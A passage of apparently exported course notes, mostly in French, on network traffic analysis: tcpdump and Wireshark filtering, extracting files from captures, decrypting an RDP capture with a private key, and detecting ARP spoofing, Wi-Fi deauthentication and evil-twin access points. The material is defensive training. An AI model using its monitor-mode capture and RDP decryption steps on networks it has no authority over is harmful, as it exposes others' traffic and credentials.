L’émission non autorisée de certificats peut fournir aux attaquants un accès durable et silencieux à l’environnement.</code></pre></div></details><p class="" id="1e925200-7eb4-8087-b216-d121008fed1b"> <br/> <br/><br/> </p><p class="" id="1e925200-7eb4-80ea-832f-fe4324e99ef4"> </p><p class="" id="1e925200-7eb4-801b-b37c-e7777bfc1963"><br/></p><p class="" id="1e925200-7eb4-80dc-9d9f-dfd4256ed5e2"> <br/> <br/> <br/><br/> <br/><br/><br/><br/><br/></p><p class="" id="1e925200-7eb4-806f-af4e-ec28d90bfda0"> </p><p class="" id="1e925200-7eb4-80d2-8e97-da73fb90464c"> </p><p class="" id="1e925200-7eb4-8060-8b5d-f68d961dc5aa"> <br/><br/><br/></p></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Intro to Network Traffic Analysis</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Tcpdump Fundamentals</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8068-b6da-ec0a98775b5e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Introduction à Tcpdump

Tcpdump est un analyseur de paquets en ligne de commande (packet sniffer) utilisé pour capturer et interpréter les trames réseau provenant des interfaces réseau. Principalement disponible sur les systèmes Unix/Linux, Tcpdump permet d’observer le trafic réseau "en direct", ce qui en fait un outil indispensable pour l’analyse, le dépannage et l’investigation réseau.
Tcpdump requiert les droits root pour accéder aux interfaces matérielles réseau. Sur les systèmes Linux, il est généralement exécuté via sudo.
Sur Windows, on peut utiliser WinDump ou lancer Tcpdump via WSL (Windows Subsystem for Linux).

Options de base pour la capture

Tcpdump propose de nombreux commutateurs (switches) pour personnaliser les captures :

| Option              | Description                                                     |
| ------------------- | --------------------------------------------------------------- |
| -D                | Affiche les interfaces réseau disponibles.                      |
| -i                | Spécifie une interface à utiliser (ex : -i eth0).             |
| -n                | Désactive la résolution des noms d’hôtes.                       |
| -nn               | Désactive la résolution des noms d’hôtes et des ports.      |
| -e                | Affiche l’en-tête Ethernet dans les résultats.                  |
| -X                | Affiche le contenu des paquets en hexadécimal et ASCII. |
| -v, -vv, -vvv | Augmente le niveau de verbosité.                                |
| -c                | Capture un nombre défini de paquets, puis quitte.               |
| -s                | Définit la longueur maximale des paquets capturés.              |
| -S                | Affiche les numéros de séquence TCP absolus.                    |
| -q                | Affiche un résumé minimal du protocole.                         |
| -r                | Lit les paquets depuis un fichier.                              |
| -w                | Écrit les paquets dans un fichier pour une analyse ultérieure.  |

Exemples d'utilisation
Afficher les interfaces disponibles

sudo tcpdump -D
Capturer le trafic d'une interface spécifique

sudo tcpdump -i eth0
Désactiver la résolution DNS et des ports

sudo tcpdump -i eth0 -nn
Inclure l’en-tête Ethernet

sudo tcpdump -i eth0 -e
Afficher les paquets en HEX/ASCII

sudo tcpdump -i eth0 -X
Combiner plusieurs options

sudo tcpdump -i eth0 -nnvXX
Interprétation de la sortie Tcpdump

La sortie peut inclure plusieurs champs :

| Champ                       | Description                                          |
| --------------------------- | ---------------------------------------------------- |
| Horodatage              | Heure de capture du paquet.                          |
| Protocole               | Protocole de couche supérieure (IP, TCP, UDP, etc.). |
| Source / Destination    | IP et ports d’origine et de destination.             |
| Drapeaux TCP            | Indicateurs SYN, ACK, RST, etc.                      |
| N° de séquence et d’ACK | Suivi des segments TCP.                              |
| Options du protocole    | Fenêtre TCP, SACK, etc.                              |

Lecture &amp; Écriture de fichiers
Sauvegarder une capture dans un fichier .pcap :

sudo tcpdump -i eth0 -w ~/capture.pcap
Lire une capture existante :

sudo tcpdump -r ~/capture.pcap
Astuce : Ajoutez les options comme -X ou -vvv pour une lecture plus détaillée.

Utilisation avancée : Tcpdump comme IDS léger

Tcpdump peut être intégré dans des scripts de détection d’intrusion simples, par exemple :
Détecter un nombre inhabituel de requêtes ICMP (ping) depuis une IP.
Automatiser des alertes ou des blocages via des règles de pare-feu ou des logs.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Tcpdump Packet Filtering</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8057-ac7f-d3dfddb8779e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Filtres Avancés avec Tcpdump

L’utilisation de filtres avancés dans Tcpdump permet de réduire le volume de trafic affiché ou enregistré, ce qui améliore les performances et économise de l’espace disque. Ces filtres peuvent être associés à la syntaxe classique de Tcpdump pour effectuer des captures ciblées : d’un simple hôte à des flux très spécifiques via des ports ou des indicateurs TCP.

Filtres Tcpdump Utiles

| Filtre               | Effet                                                               |
| -------------------- | ------------------------------------------------------------------- |
| host               | Affiche le trafic impliquant un hôte donné (trafic bidirectionnel). |
| src / dst        | Filtre selon l’adresse source ou destination.                       |
| net                | Filtre le trafic d’un réseau (notation CIDR, ex : /24).           |
| proto              | Filtre par protocole (ex : tcp, udp, icmp, ether).          |
| port               | Filtre le trafic avec un port source ou destination spécifique.     |
| portrange          | Filtre un intervalle de ports (ex : 0-1024).                      |
| less / greater   | Filtre selon la taille des paquets.                                 |
| and / or / not | Combine, ajoute ou exclut des conditions.                           |

Exemples de Filtres Pratiques
Filtrage par Hôte

sudo tcpdump -i eth0 host 172.16.146.2
Filtrage par Source

sudo tcpdump -i eth0 src host 172.16.146.2
Filtrage par Port Source

sudo tcpdump -i eth0 tcp src port 80
Filtrage par Réseau Destination

sudo tcpdump -i eth0 dst net 172.16.146.0/24
Filtrage par Protocole

sudo tcpdump -i eth0 udp
sudo tcpdump -i eth0 proto 17  # UDP (protocole 17)
Filtrage par Port / Plage de Ports

sudo tcpdump -i eth0 tcp port 443
sudo tcpdump -i eth0 portrange 0-1024
Filtrage par Taille de Paquet

sudo tcpdump -i eth0 less 64
sudo tcpdump -i eth0 greater 500
Combinaisons de Filtres
Avec AND

sudo tcpdump -i eth0 host 192.168.0.1 and port 23
Avec OR

sudo tcpdump -r sus.pcap icmp or host 172.16.146.1
Avec NOT

sudo tcpdump -r sus.pcap not icmp
Capture vs. Analyse Postérieure
Filtrage en pré-capture : les paquets non correspondants ne sont pas enregistrés → gain de place mais perte possible d’infos.
Filtrage en post-capture : les paquets sont filtrés lors de la lecture d’un fichier .pcap, sans affecter les données d’origine.

Astuces d’Interprétation

| Option                 | Usage                                                                     |
| ---------------------- | ------------------------------------------------------------------------- |
| -S                   | Affiche les numéros de séquence TCP absolus.                              |
| -v, -X, -e       | Affiche plus de détails sur les paquets.                                  |
| -c, -n, -s, -q | Modifie le format ou le volume de sortie.                                 |
| -A                   | Affiche uniquement le contenu ASCII (pratique pour les données lisibles). |
Exemple : ASCII uniquement

sudo tcpdump -Ar telnet.pcap
Analyse de contenu avec grep

Filtrer un fichier .pcap en temps réel :

sudo tcpdump -Ar http.cap -l | grep 'mailto:*'
Filtrage avancé sur les flags TCP

Pour cibler les paquets avec le flag SYN activé :

tcpdump -i eth0 'tcp[13] &amp; 2 != 0'
Références RFC des Protocoles

| Protocole | RFC                                                     |
| --------- | ------------------------------------------------------- |
| IP        | [RFC 791](https://datatracker.ietf.org/doc/html/rfc791) |
| ICMP      | [RFC 792](https://datatracker.ietf.org/doc/html/rfc792) |
| TCP       | [RFC 793](https://datatracker.ietf.org/doc/html/rfc793) |
| UDP       | [RFC 768](https://datatracker.ietf.org/doc/html/rfc768) |</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Interrogating Network Traffic With Capture and Display Filters</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-809e-be79-ef705d5f3a6f"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Objectifs du Laboratoire Tcpdump
Apprendre à filtrer le trafic capturé pour en extraire des données utiles.
Identifier les serveurs répondant aux requêtes DNS et HTTP/HTTPS.
Analyser les modèles de communication réseau et les connexions.

Tâches à Réaliser

| Tâche                                                     | Description                                                                                                              | Commande / Détails                                                                             |
| --------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------- |
| Tâche 1 : Lecture du fichier .pcap sans filtre        | Observez la capture brute.                                                                                               | tcpdump -r fichier.pcap                                                                      |
| Tâche 2 : Identifier les types de trafic              | Recherchez les protocoles et ports utilisés.                                                                     | Protocoles typiques : DNS (53), HTTP (80), HTTPS (443)                                         |
| Tâche 3 : Identifier les échanges et modèles          | Analysez les connexions client/serveur.&lt;br&gt;Repérez les handshakes TCP.                                           | tcpdump -S -r fichier.pcap pour voir les séquences TCP complètes                             |
| Tâche 4 : Analyse détaillée de la capture             | Trouvez :&lt;br&gt;- Timestamp de la première conversation&lt;br&gt;- Réponse DNS pour apache.org&lt;br&gt;- Protocole en fonction du port | tcpdump -r fichier.pcap -nn&lt;br&gt;tcpdump -r fichier.pcap src host [IP]                       |
| Tâche 5 : Filtrer le trafic DNS uniquement            | Isolez les paquets UDP sur port 53.&lt;br&gt;Analysez les noms de domaine, types d’enregistrements.                        | sudo tcpdump -r fichier.pcap udp and port 53&lt;br&gt;tcpdump -X -r fichier.pcap                 |
| Tâche 6 : Filtrer le trafic HTTP/HTTPS                | Isolez les ports 80 et 443.&lt;br&gt;Identifiez les méthodes HTTP (GET, POST) et les codes réponse.                    | tcpdump -r fichier.pcap 'port 80 or port 443'                                                |
| Tâche 7 : Analyser le premier serveur de conversation | Examinez la réponse HTTP pour en déduire la techno serveur (Apache, Nginx...).                                       | tcpdump -X -r fichier.pcap&lt;br&gt;Regardez dans le contenu HTTP : headers comme Server: Apache |

Pistes d’Analyse à Suivre

Posez-vous les questions suivantes pendant l'analyse :
Quels types de trafic sont présents (protocoles, ports) ?
Combien de conversations uniques ou hôtes distincts ?
Quel est le timestamp de la première connexion TCP ?
Quels filtres Tcpdump peuvent simplifier l’analyse ?
Quels serveurs répondent sur des ports standards ?
Quels types de requêtes DNS et méthodes HTTP sont utilisés ?</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Wireshark Advanced Usage</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-802d-8e9a-f1fd244107d5"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Plugins dans Wireshark 

Wireshark propose plusieurs plugins puissants accessibles via les menus "Statistics" et "Analyze", permettant une analyse approfondie du trafic réseau.

Onglet "Statistics" (Statistiques)

Permet de visualiser des rapports détaillés sur le trafic capturé, notamment :
Répartition par protocoles
Top IP / hôtes les plus bavards
Types de conversations (TCP, UDP, IPX, etc.)

Onglet "Analyze" (Analyser)

Offre des outils pour :
Suivre les flux TCP
Filtrer par type de conversation
Créer des filtres personnalisés
Accéder à des diagnostics experts sur les anomalies réseau

Suivre un flux TCP

Wireshark peut reconstituer un flux TCP complet (conversation entre deux hôtes) dans un format lisible, idéal pour analyser des échanges HTTP, FTP, etc.
Méthode :
Clic droit sur un paquet du flux.
Sélectionnez Follow &gt; TCP Stream.
Une fenêtre s’ouvre avec toute la conversation reconstituée.
Filtre alternatif :

tcp.stream eq #
Remplacez # par le numéro du flux (visible dans la colonne "Stream Index") pour afficher uniquement les paquets de cette conversation.

Extraction de données ou fichiers

Si une conversation complète est capturée, Wireshark peut extraire des fichiers transmis, notamment via FTP, HTTP ou SMB.
Étapes pour extraire un fichier :
Arrêtez la capture.
Allez dans File &gt; Export Objects, puis choisissez le protocole (HTTP, DICOM, SMB, etc.).
Sélectionnez les fichiers listés et cliquez sur Save As pour les extraire.

Analyse du protocole FTP

Le protocole FTP utilise :
Port 21 pour les commandes de contrôle (authentification, liste de fichiers).
Port 20 pour le transfert de données.
Filtres utiles dans Wireshark :

| Filtre                | Fonction                                              |
| --------------------- | ----------------------------------------------------- |
| ftp                 | Affiche tout le trafic FTP (port 21)                  |
| ftp.request.command | Affiche les commandes FTP (USER, PASS, RETR, STOR...) |
| ftp-data            | Montre les transferts de fichiers sur le port 20      |

Reconstruction d’un fichier FTP depuis un .pcap :
Filtrer le trafic FTP :

   ftp
   Identifier les commandes :

   ftp.request.command
   Permet de repérer les noms de fichiers et les tentatives de login.
Trouver les données transférées :

   ftp-data
   Suivre le flux TCP du fichier souhaité :
Clic droit &gt; Follow &gt; TCP Stream
Choisir Raw comme affichage
Enregistrer le contenu avec le nom de fichier original
Vérifier le type du fichier (par exemple avec file sous Linux) pour s'assurer qu’il a été correctement reconstruit.

Ce processus permet de réaliser des analyses forensiques précises, d’extraire des fichiers transmis sur le réseau et d’identifier des activités suspectes ou malveillantes.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Packet Inception, Dissecting Network Traffic With Wireshark</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8054-9e57-eef6579b0e19"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Objectifs du Lab : Analyse de trafic HTTP avec Wireshark

Ce laboratoire vous guide étape par étape pour analyser le trafic HTTP, identifier des transferts de fichiers (notamment des images JPEG), et extraire des fichiers à partir d’une capture réseau.

Tâche 1 : Ouvrir un fichier PCAP

But : Charger un fichier .pcap pré-capturé pour analyser le trafic HTTP.

Étapes :
Ouvrir Wireshark.
Aller dans Fichier → Ouvrir (File → Open).
Sélectionner Wireshark-lab-2.pcap.
Le fichier s’ouvre et affiche l’ensemble du trafic réseau capturé.

Tâche 2 : Filtrer le trafic HTTP

But : Se concentrer uniquement sur les communications HTTP (port 80), en particulier les requêtes GET et les réponses 200 OK (indiquant un transfert réussi de fichiers).

Étapes :
Dans la barre de filtres, taper :

   http
   Vérifier que la barre devient verte (syntaxe correcte).
Parcourir les paquets :
Rechercher les lignes contenant GET.
Identifier les réponses HTTP/1.1 200 OK.

Tâche 3 : Suivre un flux TCP

But : Examiner une session HTTP complète associée à un transfert de fichier.

Étapes :
Cliquer sur un paquet HTTP 200 OK.
Clic droit → Follow → TCP Stream.
Une nouvelle fenêtre affiche la conversation complète.
Confirmer que le fichier a bien été transféré dans ce flux.

Tâche 4 : Rechercher des images JFIF

But : Identifier les fichiers image JPEG (format JFIF) transférés via HTTP.

Étapes :
Effacer tout filtre actif.
Taper le filtre suivant :

   http &amp;&amp; image-jfif
   Ce filtre isole uniquement les paquets contenant des images JPEG intégrées, facilitant leur détection.

Tâche 5 : Extraire les images du trafic

But : Exporter les fichiers image détectés afin de les analyser ou de les transmettre à l’équipe de sécurité.

Étapes :
Aller dans le menu File → Export Objects → HTTP.
Parcourir la liste et repérer les fichiers JPEG (ex. : file.JPG).
Cliquer sur Save As pour enregistrer localement le fichier image.

Conseil de sécurité :

Les images extraites peuvent contenir des données cachées (stéganographie) ou avoir été exfiltrées illégalement. Il est essentiel de les examiner avec soin selon les instructions du responsable sécurité.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Decrypting RDP Connections</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80da-b93d-d1c9254b4952"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Laboratoire : Analyse de sessions RDP chiffrées avec Wireshark

Ce laboratoire montre comment identifier, déchiffrer et analyser le trafic RDP contenu dans un fichier .pcapng à l’aide de Wireshark, en utilisant une clé privée RSA pour accéder aux données sensibles comme le nom d'utilisateur.

Tâche 1 : Ouvrir un fichier PCAP RDP

But : Charger la capture RDP à analyser.

Étapes :
Extraire le fichier RDP-analysis.zip.
Ouvrir Wireshark.
Sélectionner Fichier → Ouvrir (File → Open) et choisir rdp.pcapng.

Tâche 2 : Analyse initiale du trafic RDP

But : Identifier le trafic RDP dans la capture, généralement sur le port TCP 3389.

Commandes de filtre :
Pour voir uniquement le trafic RDP :

  rdp
  Pour filtrer par port :

  tcp.port == 3389
  Tâche 3 : Ajouter la clé de déchiffrement dans Wireshark

But : Déchiffrer le trafic RDP avec une clé RSA privée récupérée depuis l’hôte de Bob.

Étapes :
Aller dans Édition → Préférences → Protocoles → TLS.
Sous "RSA Keys List", cliquer sur Éditer puis Ajouter une nouvelle entrée :
Adresse IP : 10.129.43.29
Port : 3389
Protocole : tpkt (ou laisser vide si nécessaire)
Fichier de clé : Sélectionner le fichier server.key
Enregistrer les changements.
Rafraîchir le fichier .pcapng dans Wireshark.

Tâche 4 : Analyse du trafic RDP déchiffré

But : Observer les données maintenant lisibles et examiner le contenu des sessions RDP.

Filtre recommandé :

rdp
Astuce : Vous pouvez aussi suivre les flux TCP pour voir l’échange complet entre client et serveur.

Questions d’analyse
Adresse IP de l'hôte initiateur :
  Chercher le premier paquet de la poignée de main TCP (SYN).
  Réponse : 10.129.43.27
Nom d'utilisateur utilisé dans la session RDP :
  Dans le trafic déchiffré (filtré avec tcp.port == 3389), chercher dans les paquets marqués "Ignored Unknown Record". Le contenu ASCII peut afficher le nom d'utilisateur.

Résumé et enseignement

Grâce à la clé privée RSA, Wireshark permet de déchiffrer des protocoles habituellement sécurisés comme RDP. Cela est crucial en analyse forensique et en réponse à incident, car :
Le contenu des sessions RDP peut être examiné.
Des données sensibles comme les identifiants de connexion peuvent être récupérées.
Cela renforce l’importance de protéger les clés privées et de restreindre les accès RDP.</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Intermediate Network Traffic Analysis Overview</summary><div class="indented"><p class="" id="1e925200-7eb4-8014-8183-fce4ebc30190">
</p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>ARP Spoofing &amp; Abnormality Detection</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80a5-9389-f611cede7e0a"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d’ensemble
Le protocole ARP (Address Resolution Protocol) est souvent la cible d’attaques comme :
Man-in-the-Middle (MITM)
Déni de service (DoS)
Ces attaques sont détectables car elles s'appuient sur des diffusions réseau (broadcast), capturables via un sniffer de paquets.

Fonctionnement du protocole ARP
Les hôtes utilisent ARP pour connaître l’adresse MAC associée à une IP sur le réseau local.

Étapes du processus ARP :
L’hôte A vérifie son cache ARP.
Si l’IP n’est pas trouvée, il diffuse une requête ARP (ARP Request).
L’hôte B répond avec une réponse ARP (ARP Reply) contenant son adresse IP et MAC.
Le cache ARP de A est mis à jour avec la nouvelle correspondance IP-MAC.

Empoisonnement / Usurpation ARP (ARP Poisoning &amp; Spoofing)
ARP Cache Poisoning : L’attaquant envoie de fausses trames ARP pour tromper les caches ARP.
Étapes de l’attaque :
L’attaquant envoie des ARP Replies falsifiées à la victime et au routeur.
Les deux mettent à jour leur cache avec la fausse adresse MAC de l’attaquant.
L’attaquant devient un relais, intercepte le trafic et peut le modifier (attaque MITM).

Détection &amp; Prévention
Détection :
Surveiller les modèles inhabituels de trafic ARP (ex. : requêtes répétées).
Repérer des incohérences IP-MAC dans les réponses ARP.
Prévention :
Entrées ARP statiques : empêchent la mise à jour automatique (mais difficiles à gérer).
Sécurité des ports sur les switches : limite les MAC autorisées sur un port réseau.

Détection pratique avec tcpdump et Wireshark
Installation de tcpdump :

sudo apt install tcpdump -y
Capture du trafic ARP :

sudo tcpdump -i eth0 -w capturearp.pcapng
Analyse dans Wireshark :

wireshark capturearp.pcapng
Filtres Wireshark utiles :

| But                    | Filtre                                              |
| ---------------------- | --------------------------------------------------- |
| Requêtes ARP           | arp.opcode == 1                                   |
| Réponses ARP           | arp.opcode == 2                                   |
| Duplications d’adresse | arp.duplicate-address-detected &amp;&amp; arp.opcode == 2 |

Examiner les anomalies IP/MAC

Utilisez arp -a sur Linux pour inspecter la table ARP :

arp -a | grep 50:eb:f6:ec:0e:7f
arp -a | grep 08:00:27:53:0c:ba
Dans Wireshark, filtrez les adresses MAC suspectes :

eth.addr == 50:eb:f6:ec:0e:7f or eth.addr == 08:00:27:53:0c:ba</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>ARP Scanning &amp; Denial-of-Service</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8009-af95-c2fbeeffb24d"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Signes d’activités anormales dans le trafic ARP

En plus des attaques de type poisoning et spoofing, des acteurs malveillants peuvent aussi exploiter ARP pour effectuer du renseignement réseau.
Indicateurs d’un scan ARP :
Requêtes ARP broadcast envoyées à des adresses IP séquentielles (ex. : .1, .2, .3, …).
Requêtes ARP envoyées vers des hôtes inexistants.
Volume anormal de trafic ARP provenant d’un seul hôte (potentiellement compromis ou malveillant).

Détection d’un scan ARP

En ouvrant le fichier ARP_Scan.pcapng dans Wireshark et en appliquant le filtre suivant :

arp.opcode
On peut observer :
Un hôte envoyant des requêtes ARP vers toutes les IP d’un sous-réseau, ce qui suggère un scan ARP actif (souvent initié par des outils comme Nmap).
Les réponses ARP des hôtes actifs permettent à l’attaquant de cartographier les équipements en ligne.

Identification d’un déni de service (DoS) via ARP
Étapes d’une attaque ARP DoS :
L’attaquant scanne les hôtes actifs.
Il tente de corrompre les caches ARP du réseau :
En attribuant des nouvelles adresses MAC à chaque IP légitime.
En attribuant une même IP (ex. : 192.168.10.1) à plusieurs machines (conflits d’IP), perturbant la communication.
Objectif :

Plonger le sous-réseau dans le chaos ARP, entraînant :
Perturbation des connexions.
Possibilité d’interception (MITM).
Saturation du cache ARP des équipements (DoS).

Réaction face aux attaques ARP
Traçage et identification :
Remonter à la machine physique qui émet les paquets ARP suspects.
Il est possible qu’elle soit elle-même infectée ou utilisée comme relais.
Confinement :
Déconnecter ou isoler le segment réseau affecté via le switch ou le routeur.
Cela permet de stopper la propagation, bloquer la fuite de données ou mettre fin à l’attaque DoS/MITM.

Remarque Importante
Les attaques au niveau de la couche liaison (couche 2 OSI) peuvent sembler anodines au départ, mais leur détection précoce est cruciale pour éviter des exfiltrations à des couches supérieures.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>802.11 Denial of Service</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-805f-99f0-c16bde3c65ca"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">802.11 (Wi-Fi) Traffic Analysis: Detecting Attacks

In traffic analysis, it's essential to focus on link-layer protocols like 802.11 (Wi-Fi). Many network defenders overlook Wi-Fi traffic attacks, which can lead to significant vulnerabilities, especially if human error compromises perimeter security.
Capturing 802.11 Traffic

To analyze raw 802.11 traffic, a wireless interface in monitor mode is required. This mode allows you to capture unencrypted frames without the need for an active association with an access point (AP). It’s similar to promiscuous mode but specifically designed for Wi-Fi.
Steps to Capture Traffic:
Enumerate Wireless Interfaces:
   In Linux, use iwconfig to list wireless interfaces.

   iwconfig
   Enable Monitor Mode:
   There are multiple ways to enable monitor mode. Here are two methods:
Option 1: Using airmon-ng:

     sudo airmon-ng start wlan0
     Option 2: Using system utilities:

     sudo ifconfig wlan0 down
     sudo iwconfig wlan0 mode monitor
     sudo ifconfig wlan0 up
     Verify Monitor Mode:
   After enabling monitor mode, verify it with iwconfig:

   iwconfig
   Capture Traffic Using airodump-ng:
   To capture Wi-Fi traffic, specify the AP’s channel and BSSID, and output the results to a file using airodump-ng:

   sudo airodump-ng -c 4 --bssid F8:14:FE:4D:E6:F1 wlan0 -w raw
   How Deauthentication Attacks Work

Deauthentication and dissociation attacks are common types of link-layer attacks that attackers use for a variety of purposes:
Capturing WPA handshakes
Disrupting service
Forcing clients to connect to rogue or malicious networks

In these attacks, the attacker spoofs deauthentication frames from the legitimate Access Point (AP), tricking connected clients into disconnecting. This forces the client to re-authenticate, allowing the attacker to intercept the WPA handshake.

Tools commonly used for deauthentication attacks include:
aireplay-ng
mdk4

Often, the reason code 7 (from the 802.11 standard) is used for deauthentication in these attacks.

Detecting Deauthentication Attacks

When monitoring traffic, you can look for deauthentication frames sent from the AP's BSSID. In Wireshark, use the following steps to detect deauthentication attacks:
Filter for the AP’s BSSID:
   This isolates the frames sent by the targeted AP.

   wlan.bssid == xx:xx:xx:xx:xx:xx
   Filter for Deauthentication Frames:
   Deauthentication frames are identified by the frame type and subtype. The subtype value for deauthentication is 12.

   (wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.typesubtype == 12)
   Look for Reason Code 7:
   Reason code 7 is commonly used for deauthentication attacks. If a large number of deauthentication frames are seen with this reason code, it’s likely an attack.

   (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.typesubtype == 12) and (wlan.fixed.reasoncode == 7)
   Revolving Reason Codes:

Sophisticated attackers may rotate the reason codes to avoid detection. To detect this, you can create filters for different reason codes. For example:
Reason Code 1:

  (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.typesubtype == 12) and (wlan.fixed.reasoncode == 1)
  Reason Code 2:

  (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.typesubtype == 12) and (wlan.fixed.reasoncode == 2)
  This allows you to capture attacks that don’t always use reason code 7.

Compensating Measures

To prevent deauthentication attacks and other link-layer attacks, consider the following defensive strategies:
Enable IEEE 802.11w: This standard provides Management Frame Protection (MFP), which helps secure management frames like deauthentication and disassociation frames.
Use WPA3-SAE: WPA3 offers better protection against offline dictionary attacks and improves security over WPA2.
Update WIDS/WIPS: Wireless Intrusion Detection and Prevention Systems (WIDS/WIPS) can help detect and mitigate such attacks. Ensure your detection rules are up-to-date.

Detecting Failed Authentication Attempts

Excessive association requests may indicate an attack, as attackers will often try to associate with the network to capture the WPA handshake. To capture these requests in Wireshark, filter for association-related frames:

(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.typesubtype == 0) or (wlan.fc.typesubtype == 1) or (wlan.fc.typesubtype == 11)
This filter helps identify failed authentication attempts or repeated association requests, which can be signs of a dictionary or brute force attack.

Conclusion

Monitoring 802.11 traffic for signs of deauthentication attacks, failed authentications, and other suspicious activity is crucial in maintaining Wi-Fi security. By utilizing tools like Wireshark and airodump-ng, and applying the correct filters, you can detect these attacks early and take appropriate actions to protect the network. Additionally, enabling robust security protocols like WPA3 and 802.11w will significantly reduce the likelihood of such attacks succeeding.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Rogue Access Point &amp; Evil-Twin Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-803b-8502-fd6c4f72d057"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Point d'Accès Rogue (Rogue AP)

Un point d'accès rogue est un appareil non autorisé connecté directement au réseau, ce qui permet de contourner les contrôles périphériques. Ces points d'accès peuvent :
Contourner la segmentation du réseau.
Fournir un accès non autorisé à des sections restreintes du réseau.
Parfois infiltrer des réseaux isolés (air-gapped).
Evil-Twin

Un point d'accès Evil-Twin est généralement un point d'accès autonome, séparé du réseau légitime, utilisé par les attaquants pour intercepter des données via des attaques de type Man-in-the-Middle (MITM). Ces points d'accès :
Sont souvent configurés pour capturer des informations sensibles, telles que des identifiants sans fil.
Peuvent héberger des portails malveillants pour inciter les utilisateurs à divulguer leurs informations de connexion.
Détection avec Airodump-ng

Nous pouvons utiliser airodump-ng avec un filtre ESSID pour détecter les points d'accès Evil-Twin :

sudo airodump-ng -c 4 --essid HTB-Wireless wlan0 -w raw
Exemple de sortie :

CH  4 ][ Elapsed: 1 min ][ 2023-07-13 16:06    
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
F8:14:FE:4D:E6:F2   -7 100      470      155    0   4   54   OPN              HTB-Wireless
F8:14:FE:4D:E6:F1   -5  96      682        0    0   4  324   WPA2 CCMP   PSK  HTB-Wireless 
Cet exemple montre un AP malveillant ouvert avec un ESSID identique à notre AP légitime, suggérant une attaque de type hostile portal.
Analyse des Beacons pour la Détection d'Evil-Twin

Pour confirmer des anomalies, examinez les trames de beacon avec ce filtre Wireshark :

(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)
Analyse des Beacons :
Information RSN : L'AP légitime peut contenir des informations RSN indiquant WPA2 avec AES/TKIP et PSK. En revanche, un AP malveillant pourrait ne pas avoir ces informations RSN.
Champs supplémentaires : Pour des attaques sophistiquées, vérifiez les informations spécifiques au vendeur et d'autres identifiants uniques qui pourraient manquer dans l'AP de l'attaquant.
Identification des Utilisateurs Compromis

Dans le cas d'attaques Evil-Twin sur un réseau ouvert :
Utilisez le filtre Wireshark suivant pour isoler le trafic provenant de l'AP suspect :

(wlan.bssid == F8:14:FE:4D:E6:F2)
La détection des requêtes ARP provenant d'un appareil client sur ce réseau pourrait indiquer un compromis potentiel. Notez :
L'adresse MAC de l'appareil client.
Le nom d'hôte.

Prenez des mesures réactives comme des réinitialisations de mots de passe pour atténuer le risque.
Détection des Points d'Accès Rogue

La détection des points d'accès rogue passe souvent par la surveillance des dispositifs réseau. Il faut chercher :
Des réseaux non reconnus avec des signaux forts, en particulier des réseaux ouverts.
Des points d'accès suspects à proximité (par exemple, des hotspots Windows).

Les réseaux inconnus sans cryptage peuvent indiquer des points d'accès rogue mis en place pour contourner la sécurité du réseau.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Fragmentation Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80d7-9bc7-c6615b01bfb8"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">L'Analyse des Trafic Réseau au Niveau de la Couche IP et l'Abus de la Fragmentation

